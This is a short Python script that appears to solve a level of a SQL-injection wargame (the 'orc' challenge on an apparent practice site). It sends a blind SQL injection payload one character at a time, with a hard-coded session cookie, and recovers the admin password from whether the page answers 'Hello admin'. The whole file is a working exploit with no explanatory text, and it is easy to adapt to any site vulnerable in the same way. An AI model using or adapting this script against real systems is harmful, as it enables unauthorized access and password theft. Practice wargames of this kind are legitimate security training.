import urllib.request
from urllib.parse import quote
key = ""
for i in range(1, 9):
    for j in range(48, 127):
        url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
        data = "' or id='admin' UNION(select substr(pw,1,{}))='{}'#".format(str(i), key + chr(j))
        print(data)

        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
        re.add_header("Cookie", "PHPSESSID=4p56htpvcookallo00ondblnf6")

        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)